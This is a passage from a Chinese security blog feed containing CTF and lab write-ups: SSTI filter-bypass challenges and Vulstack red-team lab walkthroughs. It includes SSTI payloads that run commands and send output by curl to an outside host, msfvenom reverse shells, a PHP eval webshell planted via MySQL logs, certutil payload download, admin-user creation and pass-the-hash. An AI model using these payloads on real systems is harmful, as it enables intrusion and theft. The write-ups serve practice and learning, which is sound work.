class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">HOST=<span class="string">&#x27;172.25.0.2&#x27;</span></span><br><span class="line">PORT=<span class="number">21587</span></span><br><span class="line">BUFSIZ=<span class="number">1024</span></span><br><span class="line">ADDR=(HOST,PORT)</span><br><span class="line">tcpCliSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpCliSock.connect(ADDR)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">data=<span class="string">b&#x27;*ctf&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">tcpCliSock.send(data)</span><br><span class="line">data = tcpCliSock.recv(BUFSIZ)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">tcpCliSock.close()</span><br></pre></td></tr></table></figure><p>但是有个问题，题目的服务器每两分钟重启一次，拿到shell后再装vim什么的太慢了，于是将脚本base64编码，</p><p>echo base64_encoded_script | base64 -d &gt;1.py</p><p>以这种方式将脚本内容上传至webserver，python3 1.py执行即可。</p><img src="http://cdn.polowong.top/static/images/xingctf.png"><p>我认为client.py 和client的容器是起迷惑作用 或者说是模拟别人在向server发送请求，所以在本地模拟时把client容器down掉就可以了。</p><p>为了验证这里一理论，我在题目的在线环境中通过webserver打到client服务器进行了LFI，发现并没有client.py，我认为上述说法成立。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>当前还有个问题就是不知道是哪句话实现了删除文件前执行了文件里的内容。</p><p>参考链接：</p><p>雪宝wp</p><p><a href="https://blog.csdn.net/weixin_30526593/article/details/98650248">https://blog.csdn.net/weixin_30526593/article/details/98650248</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>近期ssti题目总结</title>
      <link href="2020/12/22/%E8%BF%91%E6%9C%9Fssti/"/>
      <url>2020/12/22/%E8%BF%91%E6%9C%9Fssti/</url>
      
        <content type="html"><![CDATA[<p>分析下近期做过的ssti题目的思路</p><h1 id="你的名字-题目分析"><a href="#你的名字-题目分析" class="headerlink" title="你的名字 题目分析"></a>你的名字 题目分析</h1><p>打开题目 发现输入名字</p><p>尝试输入4</p><p>报了一个php的错误</p><p>继续尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print 2*5 %&#125;</span><br></pre></td></tr></table></figure><p>成功.</p><p>下面将尝试利用ssti进行文件读取/命令执行</p><p>尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print config%&#125;</span><br></pre></td></tr></table></figure><p>失败，返回值为空</p><p>尝试多个关键字后，发现是对黑名单关键词采取了置空的方法进行过滤，那么可以考虑在关键字中加入另一个关键字的方式，如 iconfigf 代表if。</p><p>首先获得所有子类</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.__claconfigss__.__mrconfigo__[<span class="number">2</span>].__subclconfigasses__()%&#125;</span><br></pre></td></tr></table></figure><p>拿到所有子类后，查找init global存在os模块的类，常见的是catch_warnings类</p><p>我这里用的是笨方法，将所有的子类打印出来后放到sublime里面找到的catch_warings类的下标为59</p><p>下面将进一步利用该类实现命令执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche.oconfigs.popconfigen(&#39;curl 172.16.157.75:7777 -d  &#96;ls &#x2F; |base64&#96;  &#39;)%&#125;</span><br><span class="line"></span><br><span class="line">通过curl外带命令执行的结果,获得了外带的根目录ls的结果，发现了flag的存放位置，直接getflag。</span><br><span class="line"></span><br><span class="line">&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche.oconfigs.popconfigen(&#39;curl 172.16.157.75:7777 -d  &#96;tail &#x2F;flag_1s_Hera|base64&#96;&#39;)%&#125;</span><br></pre></td></tr></table></figure><h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>介绍popen的用法</p><p>popen方法在os模块下，使用前需要import os</p><p>popen是从一个命令打开一个管道，返回值意味着执行结果，正常执行的话返回值为0</p><p>popen在ssti中常作为替代system进行命令执行的一种方式，现演示popen用法</p><img src="http://cdn.polowong.top/static/images/ssti4.png"><p>在此例中可以看到，调用os.popen.read()方法会返回执行系统命令的结果，而不是执行成功的返回值0</p><p>popen方法中subprocess模块下也有。</p><h1 id="安洵杯-normal-ssti"><a href="#安洵杯-normal-ssti" class="headerlink" title="安洵杯 normal_ssti"></a>安洵杯 normal_ssti</h1><p>首先看过滤了哪些关键字</p><img src="http://cdn.polowong.top/static/images/ssti1.png"><p>使用burp fuzz关键字，发现过滤了很多的关键字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先看过滤了&#123;&#123;,可以使用&#123;%print%&#125;</span><br></pre></td></tr></table></figure><p>的方式执行表达式</p><p>过滤了空格，可以用小括号的方式绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(1)%&#125;</span><br></pre></td></tr></table></figure><p>这里还过滤了.  可以用a t t r()绕过</p><p>其他的关键字可以考虑使用unicode编码绕过</p><p>lipsum方法globlas-builtins中存在os模块，可以直接执行命令。</p><p>首先构造未编码payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;whoami&quot;)|attr(&quot;read&quot;)())%&#125;</span><br></pre></td></tr></table></figure><p>然后构造编码payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:5050&#x2F;test?url&#x3D;&#123;%print(lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u006f\u0073&quot;)|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0077\u0068\u006f\u0061\u006d\u0069&quot;)|attr(&quot;\u0072\u0065\u0061\u0064&quot;)())%&#125;</span><br><span class="line"></span><br><span class="line">接下来尝试读取flag：</span><br><span class="line"></span><br><span class="line">&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat&lt;&gt;&#x2F;flag&quot;)|attr(&quot;read&quot;)())%&#125;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;localhost:5050&#x2F;test?url&#x3D;&#123;%print(lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u006f\u0073&quot;)|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067&quot;)|attr(&quot;\u0072\u0065\u0061\u0064&quot;)())%&#125;</span><br></pre></td></tr></table></figure><img src="http://cdn.polowong.top/static/images/ssti2.png"><h2 id="另一种思路"><a href="#另一种思路" class="headerlink" title="另一种思路"></a>另一种思路</h2><p>看了师傅们的解法，我在尝试另一种编码绕过的方式解决这个问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1:http:&#x2F;&#x2F;127.0.0.1:5050&#x2F;test?url&#x3D;&#123;%print(1|attr(%22\137\137class\137\137%22)|attr(%22\137\137mro\137\137%22)|attr(%22\137\137\147etitem\137\137%22)(1)|attr(%22\137\137subclasses\137\137%22)()|attr(%22\137\137\147etitem\137\137%22)(186)|attr(%22\137\137init\137\137%22)|attr(%22\137\137\147lobals\137\137%22)|attr(&quot;\137\137\147etitem\137\137&quot;)(&quot;sys&quot;)|attr(&quot;modules&quot;)|attr(&quot;\137\137\147etitem\137\137&quot;)(&quot;os&quot;)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)())%&#125;</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1:5050&#x2F;test?url&#x3D;&#123;%print(a|attr(%22\137\137init\137\137%22)|attr(%22\137\137\147lobals\137\137%22)|attr(%22\137\137\147etitem\137\137%22)(%22sys%22)|attr(%22modules%22)|attr(%22\137\137\147etitem\137\137%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)())%&#125;</span><br></pre></td></tr></table></figure><p>上述两种方法是通过找sys模块中的os进行命令执行。（膜一下师傅：）</p><h1 id="nctf-2020-ssti"><a href="#nctf-2020-ssti" class="headerlink" title="nctf 2020 ssti"></a>nctf 2020 ssti</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;init&#x27;</span>,<span class="string">&#x27;global&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;req&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;get&#x27;</span>]</span><br></pre></td></tr></table></figure><p>懒了，改一下上题的blacklist继续跑（doge</p><p>先用bp fuzz一下，发现过滤了很多关键字。</p><img src="http://cdn.polowong.top/static/images/ssti3.png"><p>根据上题思路，尝试unicode绕过对关键字的过滤，如</p><p>class -&gt;  \u0063\u006c\u0061\u0073\u0073</p><p>这种方法可以成功bypass。</p><p>官方wp的方法是用十六进制绕过，也是可以的，下面是用16进制绕过的pld：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.90.89.27:5050/test?url=&#123;&#123;%22%22[%22\x5f\x5fcla%22+%22ss\x5f\x5f%22][%22\x5f\x5fmr%22+%22o\x5f\x5f%22][1][%22\x5f\x5fsubcla%22+%22sses\x5f\x5f%22]()[186][%22\x5f\x5fin%22+%22it\x5f\x5f%22][%22\x5f\x5fgloba%22+%22ls\x5f\x5f%22][%22sys%22][%22modules%22][%22os%22][%22popen%22](%22cat%3C%3E/flag%22)[%22read%22]()&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="unctf2020-ssti"><a href="#unctf2020-ssti" class="headerlink" title="unctf2020 ssti"></a>unctf2020 ssti</h1><p>blacklist:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ ] <span class="string">&#x27; &quot; _</span></span><br></pre></td></tr></table></figure><p>绕过方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[] : __getitem__</span><br><span class="line"><span class="string">&#x27;和&quot;: request.args.xxx</span></span><br><span class="line"><span class="string">_: |attr()</span></span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:http://192.168.0.116:5000/?url=&#123;&#123;()|attr(request.args.class)|attr(request.args.mro)|attr(request.args.getitem)(1)|attr(request.args.subclass)()|attr(request.args.getitem)(186)|attr(request.args.init)|attr(request.args.globals)|attr(request.args.getitem)(request.args.sys)|attr(request.args.mod)|attr(request.args.getitem)(request.args.os)|attr(request.args.popen)(request.args.whoami)|attr(request.args.read)()&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;getitem=__getitem__&amp;&amp;subclass=__subclasses__&amp;init=__init__&amp;globals=__globals__&amp;sys=sys&amp;mod=modules&amp;os=os&amp;popen=popen&amp;whoami=whoami&amp;read=read</span><br></pre></td></tr></table></figure><h1 id="nctf-2020-你就是我的master吗"><a href="#nctf-2020-你就是我的master吗" class="headerlink" title="nctf 2020 你就是我的master吗"></a>nctf 2020 你就是我的master吗</h1><p>blacklist：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; . _ class base subclasses request</span></span><br></pre></td></tr></table></figure><p>绕过方法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; :  &quot;&quot;</span></span><br><span class="line"><span class="string">. :[&quot;xxx&quot;] </span></span><br><span class="line"><span class="string">_:八进制 十六进制 Unicode 绕过 八进制如\137</span></span><br><span class="line"><span class="string">关键字： 字符串拼接 如 &quot;cla&quot;+&quot;ss&quot;</span></span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103:5000/?</span><br><span class="line">url=&#123;&#123;0[&quot;\137\137cla&quot;+&quot;ss\137\137&quot;][&quot;\137\137mro\137\137&quot;][1][&quot;\137\137subclas&quot;+&quot;ses\137\137&quot;]()[186][&quot;\137\137init\137\137&quot;][&quot;\137\137globals\137\137&quot;][&quot;sys&quot;][&quot;modules&quot;][&quot;os&quot;][&quot;popen&quot;](&quot;ls&quot;)[&quot;read&quot;]()&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>flask/jinja2渲染殷勤的ssti问题考察更多的是对builtins函数/模块的使用以及了解程度，各种绕过过滤技巧 换而言之是对python语言基础语法的理解程度和面向对象思想的熟练程度。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VULSTACK 红队评估(二) </title>
      <link href="2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/"/>
      <url>2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulstack红队评估（二）"><a href="#Vulstack红队评估（二）" class="headerlink" title="Vulstack红队评估（二）"></a>Vulstack红队评估（二）</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h3><p>webserver一开始用默认密码上不去，这里的解决方案是登录administrator账户，然后修改密码。</p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><p>新建一个VMNET，编号为1，模式为hostonly，模拟内网环境，网段为10.10.10.0/24</p><p>NAT网段为192.168.111.0/24</p><p>DC(内网)  网卡选择VMNET1，IPV4地址为  10.10.10.10    </p><p>WIN7(内网) 网卡选择VMNET1，IPV4地址为  10.10.10.20</p><p>WEBSERVER（内外网） 网卡1选择VMNET1，IPV4地址为10.10.10.80，网卡2选择NAT，DHCP auto configuration，本次地址为192.168.111.128</p><h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><p>在<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code>目录下存在三个批处理文件<code>setDomainEnv</code>，<code>startManagedWebLogic</code>，<code>stopManagedWebLogic</code>。点击配置weblogic环境。</p><p>启动服务后，访问web服务器ip:7001/console即可自动部署。</p><h1 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h1><p>进入weblogic页面后首先尝试弱口令weblogic/weblogic，登陆不进去，考虑使用weblogic扫描器。</p><img src="http://cdn.polowong.top/static/images/vs21.jpg"><p>通过扫描发现了CVE-2019-2725漏洞，尝试利用。</p><p>利用工具：</p><p><a href="https://github.com/TopScrew/CVE-2019-2725">https://github.com/TopScrew/CVE-2019-2725</a></p><p>这个脚本有个问题，明明import了sys，requests等，但是运行的时候还是会报没有import，很奇怪，把它放到if name=main里面就好了（这里大概率是name==main带来的执行顺序的问题）</p><p>顺利运行脚本后，即可获得一个webshell，地址为：</p><p><a href="http://192.168.111.128:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=ipconfig">http://192.168.111.128:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=ipconfig</a></p><p>先用webshell查看systeminfo,发现为64位操作系统，尝试使用msfvenom生成64位的reverse shell</p><p>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.111.129 lport=4444  a- x64 -f exe &gt;/root/Desktop/shell.exe</p><p>kali启动apache服务，并将webshell放到/var/www/html目录下</p><p>利用Windows自带的工具 certutil下载webshell</p><p>certutil.exe -urlcache -split -f <a href="http://192.168.111.129/shell.exe">http://192.168.111.129/shell.exe</a></p><p>但是不行，直接被360干掉了。</p><p>使用java反序列化终极测试工具直接上传冰蝎shell，目录为</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\wlserver_10<span class="number">.3</span>\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp</span><br></pre></td></tr></table></figure><img src="http://cdn.polowong.top/static/images/vs22.jpg"><p>可以直接连上~</p><p>下面将shell反弹到msf上，进行下一步的渗透。</p><h1 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h1><p>在meterpreter里面使用run get_local_subnets 获取服务器网卡信息</p><p>看到10网段，添加10网段路由：</p><p>run autoroute -s 10.10.10.0/24</p><p>然后启动socks代理</p><p>我这里对代理的理解是在msf启动socks5代理后，设置监听IP与端口，任何使用proxychains进行的动作都会转发到设置好的监听与端口上，与此同时msf设置了通往靶机内网的路由，便可将请求通过（命令）内网主机发送出去。</p><p>看一下net user /domain 发现了域内有五个用户</p><p>查询域控</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure><p>通过ipconfig /all查询IP地址与DNS服务器地址（一般DNS服务器地址是DC）</p><p>使用net config workstation 查询工作站情况</p><img src="http://cdn.polowong.top/static/images/vs23.jpg"><p>可以确定，当前域为de1ay.com</p><p>接下来使用ladon探测内网主机存活情况</p><p>利用失败，无回显，在虚拟机查看发现被360拦截掉了。</p><p>由于java的meterpreter没有mimikatz模块，所以这里尝试上传Windows的shell并且加载mimikatz模块。（忘记了之前生成的shell被干掉了。。没办法，尝试免杀）</p><p>使用go免杀cs成功了，成功上线</p><img src="http://cdn.polowong.top/static/images/vs25.jpg"><p>接下来尝试添加管理员用户</p><p>net user polosec admin@123 /add</p><p>net localgroup Administrators polosec /add</p><p>由于360拦截 添加失败。</p><p>通过漏洞进行权限提升，拿到一个system权限的shell。</p><h2 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h2><p>将cs会话派生给msf</p><p>首先CS新建一个foreign listener，选择https，记住设置的端口号和hsot。</p><p>msf一样的配置</p><p>注意这里一定要选reverse http 否则meterpreter会die</p><img src="http://cdn.polowong.top/static/images/vs26.jpg"><p>使用如下命令用ICMP协议探测主机存活：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL&#x3D;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用arp -a 查看arp缓存</p><img src="http://cdn.polowong.top/static/images/vs27.jpg"><p>确定主机大概为:</p><p>10.10.10.10(DC),</p><p>10.10.10.80,</p><p>10.10.10.201</p><p>目前10.10.10.80已经被拿下，下面尝试对10.10.10.10以及10.10.10.201主机进行渗透。</p><h2 id="渗透域内主机"><a href="#渗透域内主机" class="headerlink" title="渗透域内主机"></a>渗透域内主机</h2><p>通过PASS THE HASH 的方式传递NTLM hash实现上线DC和域内主机。</p><p>具体方法：</p><p>在CS中 view target -add 添加DC的IP，点击jump ，PS EXEC ，选择一个同域的账号密码进行PTH，即可顺利上线DC。</p><p>上线DC后再用mimikatz抓一下密码，然后利用同样的方法上线主机10.10.10.201。</p><img src="http://cdn.polowong.top/static/images/vs28.jpg"><p>顺利上线主机10.10.10.201：</p><img src="http://cdn.polowong.top/static/images/vs29.jpg"><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过本次对vulstack靶场的学习，</p><p>进一步了解了CS MSF的用法，加深了对bypass uac 、提权的认识，学习了初步的免杀技巧；</p><p>学会了在msf中如何配置路由对内网进行扫描，学习了几个常用的提权方式 比如MS14058 MS15051；</p><p>使用pth的方式上线域内主机等等。。</p><p>目前存在的问题也非常多，包括不太了解CS，CS的shell掉线不知道是什么问题，以及还有很多很多现在还没有学习到的知识。</p><p>针对当前问题的学习目标：了解PTH，掌握mimikatz的用法，了解如何bypass uac，认识更多的提权方法。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulstack 红队评估(一) 内网渗透</title>
      <link href="2020/12/03/vulstack-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
      <url>2020/12/03/vulstack-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="vulstack-红队评估（一）"><a href="#vulstack-红队评估（一）" class="headerlink" title="vulstack 红队评估（一）"></a>vulstack 红队评估（一）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是我第一次做内网渗透的相关内容，做一个学习记录。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>下载镜像，虚拟机默认密码hongrisec@2019，登陆后有两台需要改密码，注意密码的格式。。别忘了再重装– 我的密码是<?php admin@123 隐藏下 ?></p><p>对网络的部署需要一定的计算机网络基础知识。</p><p>kali 网卡： NAT</p><p>web服务器（DMZ区）： 网卡1 NAT  网卡2 VMNET1（hostonly）</p><p>内网服务器1（域控）  网卡 VMNET1 hostonly</p><p>内网服务器2 ： 网卡 VMNET1 hostonly</p><p>部署好后由于Windows7开了防火墙，可以向外ping但是ping不动该机器，用两台内网主机ping一下试试能不能ping动。</p><img src="http://cdn.polowong.top/static/images/vs11.jpg"><p>正常情况下</p><p>主机可以ping通两台内网主机，win7可以ping通两台内网主机，kali可以ping通win7。</p><h2 id="web渗透工作"><a href="#web渗透工作" class="headerlink" title="web渗透工作"></a>web渗透工作</h2><p>开局phpstudy探针，猜一猜数据库账号密码root/root</p><p>phpmyadmin默认路径，日进去尝试写日志getshell。</p><p>首先看看是否开日志了</p><p> <a href="http://192.168.52.3/phpMyadmin/url.php?url=http://dev.mysql.com/doc/refman/5.5/en/show.html&token=86bd43ee3e6e2d48528a7169af7ea2b4"><strong>SHOW</strong></a> <strong>VARIABLES</strong> <a href="http://192.168.52.3/phpMyadmin/url.php?url=http://dev.mysql.com/doc/refman/5.5/en/string-comparison-functions.html%23operator_like&token=86bd43ee3e6e2d48528a7169af7ea2b4"><strong>LIKE</strong></a> ‘%general%’ </p><p>没开，开一下。</p><p>set golbal   general_log=on;</p><p>设置下日志路径（探针中查看）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file &#x3D;&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;2.php&#39;;</span><br></pre></td></tr></table></figure><p>接下来查询一下，内容是shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_POST[a]); ?&gt;&#39;;</span><br></pre></td></tr></table></figure><p>之后访问蚁剑链接shell就可以了</p><p>连上shell后whoami一下，发现是administrator权限，在GOD域下(?对域的概念还不太了解)</p><p>接下来使用msfvenom生成shell连接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.54.2 lport&#x3D;5555 -f exe&gt;shell.exe</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.54.2</span><br><span class="line">set lport 5555</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>在蚁剑执行exe文件即可获得反弹shell</p><p>不太会用msf，执行命令一直啥都没有，最后知道msf有一套自己的命令，输入shell后获得了靶机的shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br><span class="line">启用RDP登录。</span><br></pre></td></tr></table></figure><p>接下来尝试上传cs 的beacon。</p><img src="http://cdn.polowong.top/static/images/vs12.jpg"><p>cs首先设置listener，生成Windows的32位可执行程序 a.exe</p><p>通过msf的meterpreter上传到目标主机并执行</p><p>upload /root/Desktop/1.exe</p><p>execute -f 1.exe</p><p>之后在cs可以看到服务器上线。</p><img src="http://cdn.polowong.top/static/images/vs13.jpg"><h2 id="msf-meterpreter-简介"><a href="#msf-meterpreter-简介" class="headerlink" title="msf meterpreter 简介"></a>msf meterpreter 简介</h2><p> Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。</p><p> 最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。其中，攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现的meterpreter作为后渗透模块有多种类型，并且命令由核心命令和扩展库命令组成，极大的丰富了攻击方式。</p><p> 需要说明的meterpreter在漏洞利用成功后会发送第二阶段的代码和meterpreter服务器dll，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令。 连上vpn又在内网中使用psexec和bind_tcp的时候经常会出现这种情况</p><h2 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h2><p>在cs中尝试使用mimikatz获取登录的用户名和密码</p><img 